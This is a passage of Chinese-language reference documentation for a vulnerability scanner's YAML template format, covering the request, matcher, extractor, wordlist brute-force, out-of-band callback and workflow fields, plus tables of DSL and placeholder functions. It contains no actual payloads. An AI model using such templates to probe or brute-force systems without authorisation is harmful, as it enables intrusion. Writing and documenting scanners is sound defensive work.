# ============ 预过滤 ============
fingerprints:                      # 可选
  - title: string                  # 匹配 <title> 标签
    header: [string, ...]          # 匹配响应头 ["Key: pattern"]

# ============ 变量 ============
variables:                         # 可选
  key: value                       # value 可包含占位符和函数

# ============ OOB ============
oob-provider: "ceye|dnslog|callbackred"  # 可选：模板级 OOB provider
oob:                               # 可选：模板级 OOB 验证配置
  provider: "ceye"
  matchers: [...]

# ============ 模板级默认值 ============
stop-at-first-match: bool          # 默认 false
matchers-condition: "and|or"       # 默认 "or"
matchers: [...]                    # 模板级默认 matcher
extractors: [...]                  # 模板级默认 extractor

# ============ 模式一：单模板 ============
http:
  - raw: string                    # 原始请求（raw 模式）
    path: [string, ...]            # 路径列表（path 模式，每个路径独立请求）
    method: string                 # HTTP 方法（path 模式，默认 GET）
    headers: {key: value}          # 请求头（path 模式）
    body: string                   # 请求体（path 模式）
    body-type: ""                  # empty/form/multipart

    timeout: int                   # 超时秒数
    redirects: bool                # 跟随重定向
    threads: int                   # 并发线程数
    rate-limit: int                # 速率限制

    matchers-condition: "and|or"   # 请求级匹配条件
    matchers:                      # 请求级 matcher
      - type: "status|word|regex|header|size|time|binary|dsl|json-word|json-2darray"
        part: "body|header|all|interactsh"
        status: [int, ...]
        words: [string, ...]
        regex: [string, ...]
        header: [string, ...]
        size: [string, ...]
        time: string
        binary: [string, ...]
        dsl: [string, ...]
        json-path: string
        json-field: string
        json-2darray-column: int
        condition: "and|or"
        negative: bool
        encoding: "url|base64|hex"
        case-insensitive: bool
    extractors:                    # 请求级 extractor
      - name: string
        type: "regex|word|kval|json|cookie"
        part: string
        regex: [string, ...]
        group: int
        words: [string, ...]
        kval: [string, ...]
        json: [string, ...]
        internal: bool
    wordlist:                      # 字典爆破
      - key: string                # 占位符 key
        path: string               # 字典文件路径
        encoding: "url|base64|hex"
    stop-at-first-match: bool      # 命中停止
    run-if: string                 # 条件执行
    probe: bool                    # 仅探测
    name: string                   # 请求名称

# ============ 模式二：工作流 ============
workflow:
  - name: string                   # 步骤名称（必填）
    template: string               # 引用其他模板
    requires: [string, ...]        # 前置依赖
    delay: int                     # 等待秒数
    provider: "ceye|dnslog|callbackred"  # 步骤级 provider
    stop-at-first-match: bool
    http:                          # 请求列表（同 http 字段）
      - ...
```

---

## 附录 B：匹配器类型速查表

| 类型 | 必填字段 | 可选字段 | 适用场景 |
|------|----------|----------|----------|
| `status` | `status` | `negative`, `part` | HTTP 状态码检测 |
| `word` | `words` | `part`, `condition`, `negative`, `encoding`, `case-insensitive` | 关键词匹配 |
| `regex` | `regex` | `part`, `condition`, `negative`, `case-insensitive` | 正则匹配 |
| `header` | `header` 或 `words` | `condition`, `negative` | 响应头匹配 |
| `size` | `size` | `negative` | 响应体大小检测 |
| `time` | `time` | `negative` | 响应时间（时间盲注） |
| `binary` | `binary` | `part` | 二进制/文件签名 |
| `dsl` | `dsl` | `part`, `condition` | 复杂条件判断 |
| `json-word` | `words` | `json-path`, `json-field`, `condition`, `negative` | JSON 字段匹配（OOB）**强制大小写不敏感** |
| `json-2darray` | `words` | `json-2darray-column`, `condition` | 二维数组匹配（dnslog）**强制大小写不敏感** |

---

## 附录 C：DSL 函数速查表

| 函数 | 签名 | 示例 | 返回值 |
|------|------|------|--------|
| `contains` | `contains(var, 'str')` | `contains(body, 'admin')` | bool |
| `contains_any` | `contains_any(var, 'a', 'b')` | `contains_any(body, 'root', 'admin')` | bool |
| `contains_all` | `contains_all(var, 'a', 'b')` | `contains_all(body, 'admin', 'panel')` | bool |
| `equals` | `equals(var, 'val')` | `equals(status_code, '200')` | bool |
| `regex` / `matches` | `regex(var, 'pattern')` | `regex(body, 'CVE-\d+-\d+')` | bool |
| `starts_with` / `has_prefix` | `starts_with(var, 'pre')` | `starts_with(header, 'HTTP/')` | bool |
| `ends_with` / `has_suffix` | `ends_with(var, 'suf')` | `ends_with(body, '.exe')` | bool |
| `to_lower_contains` | `to_lower_contains(var, 'word')` | `to_lower_contains(body, 'Admin')` | bool |
| `len` | `len(var)` | `len(body) > 100` | int（布尔上下文） |

---

## 附录 D：占位符函数速查表

| 函数 | 签名 | 默认值 | 示例 | 说明 |
|------|------|--------|------|------|
| `randstr` | `randstr(n?)` | 8 | `{{randstr}}` | 随机十六进制 |
| `rand_int` | `rand_int(min, max?)` | 1, 9999 | `{{rand_int(1,100)}}` | 随机整数 |
| `rand_text_alpha` | `rand_text_alpha(n?)` | 8 | `{{rand_text_alpha(10)}}` | 随机小写字母 |
| `rand_text_hex` | `rand_text_hex(n?)` | 16 | `{{rand_text_hex(20)}}` | 随机十六进制 |
| `rand_text_numeric` | `rand_text_numeric(n?)` | 8 | `{{rand_text_numeric(6)}}` | 随机数字 |
| `to_upper` | `to_upper(s)` | - | `{{to_upper("hi")}}` | 转大写 |
| `to_lower` | `to_lower(s)` | - | `{{to_lower("HI")}}` | 转小写 |
| `trim` | `trim(s)` | - | `{{trim(" ab ")}}` | 去空白 |
| `reverse` | `reverse(s)` | - | `{{reverse("abc")}}` | 反转 |
| `concat` | `concat(s1, s2, ...)` | - | `{{concat("a","b")}}` | 拼接 |
| `repeat` | `repeat(s, n)` | - | `{{repeat("ab",3)}}` | 重复 |
| `base64_encode` | `base64_encode(s)` | - | `{{base64_encode("x")}}` | Base64 编码 |
| `base64_decode` | `base64_decode(s)` | - | `{{base64_decode("eHg=")}}` | Base64 解码 |
| `url_encode` | `url_encode(s)` | - | `{{url_encode("a b")}}` | URL 编码 |
| `url_decode` | `url_decode(s)` | - | `{{url_decode("a%20b")}}` | URL 解码 |
| `hex_encode` | `hex_encode(s)` | - | `{{hex_encode("x")}}` | 十六进制编码 |
| `hex_decode` | `hex_decode(s)` | - | `{{hex_decode("78")}}` | 十六进制解码 |
| `md5` | `md5(s)` | - | `{{md5("x")}}` | MD5 哈希 |
| `sha1` | `sha1(s)` | - | `{{sha1("x")}}` | SHA1 哈希 |
| `sha256` | `sha256(s)` | - | `{{sha256("x")}}` | SHA256 哈希 |
| `timestamp` | `timestamp()` | - | `{{timestamp}}` | Unix 时间戳 |
| `date` | `date(fmt?)` | 2006-01-02 | `{{date}}` | 格式化日期 |
| `uuid` | `uuid()` | - | `{{uuid}}` | UUID v4 |

---

## 附录 E：变量解析优先级

```
┌─────────────────────────────────────────────────────────┐
│  1. 内置目标变量（Hostname, Port, Scheme, Path...）     │
│  2. 用户定义变量（variables 字段）                       │
│  3. Extractor 提取变量（extractors 字段）                │
│  4. OOB 变量（oob, oob_label, oob_token, oob_domain）   │
│  5. DSL ExtractedVars（跨步骤提取的变量）                │
│  6. 未解析 → 保留原样 {{xxx}}                           │
└─────────────────────────────────────────────────────────┘
```

---

## 附录 F： matcher condition 逻辑表

### 单个 matcher 内部的 condition

| condition | 含义 | 示例 |
|-----------|------|------|
| `or`（默认） | words/regex/header 中任一匹配 | `words: ["a","b"]` → 匹配 a 或 b |
| `and` | words/regex/header 中全部匹配 | `words: ["a","b"]` → 必须同时匹配 a 和 b |

### 多个 matcher 之间的 matchers-condition

| matchers-condition | 含义 | 示例 |
|--------------------|------|------|
| `or`（默认） | 任一 matcher 匹配即成功 | status=200 OR words 匹配 |
| `and` | 所有 matcher 都必须匹配 | status=200 AND words 匹配 |

### negative 的含义

| negative | 含义 | 示例 |
|----------|------|------|
| `false`（默认） | 正向匹配 | 响应中包含关键词 → 命中 |
| `true` | 取反匹配 | 响应中不包含关键词 → 命中 |

---

*文档版本 v1.3.1 — 2026-08-17*
